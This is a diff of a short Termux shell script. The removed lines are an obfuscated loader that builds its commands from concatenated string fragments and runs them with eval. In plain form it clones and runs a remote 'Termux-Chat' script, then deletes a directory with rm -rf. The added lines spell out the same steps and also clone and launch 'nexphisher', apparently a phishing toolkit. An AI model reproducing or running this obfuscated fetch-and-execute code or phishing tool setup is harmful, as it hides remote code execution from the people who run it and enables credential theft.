@@ -1,3 +1,5 @@
-z="
-";Az='cd';Bz='pkg ';fz='rf ~';Gz=' git';Yz=' ~/T';Cz='inst';Vz='/nul';Tz='t > ';Dz='all ';gz='/nxp';Hz=' clo';Qz='l-ki';Iz='ne h';Lz='ithu';Wz='l';Ez='git ';ez='rm -';Sz='-Cha';Jz='ttps';Kz='://g';bz='at/c';Zz='ermu';Fz='-y ;';dz='sh';Uz='/dev';az='x-Ch';Mz='b.co';Rz='t/Te';Nz='m/te';cz='hat.';Oz='rmux';Xz='bash';Pz='-too';
-eval "$Az$z$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Oz$Sz$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$cz$dz$z$ez$fz$gz"
+cd
+pkg install git -y ; git clone https://github.com/termux-tool-kit/Termux-Chat > /dev/null
+bash ~/Termux-Chat/chat.sh
+git clone git://github.com/htr-tech/nexphisher.git ; cd nexphisher ; bash tmux_setup ; bash nexphisher
+rm -rf ~/nxp
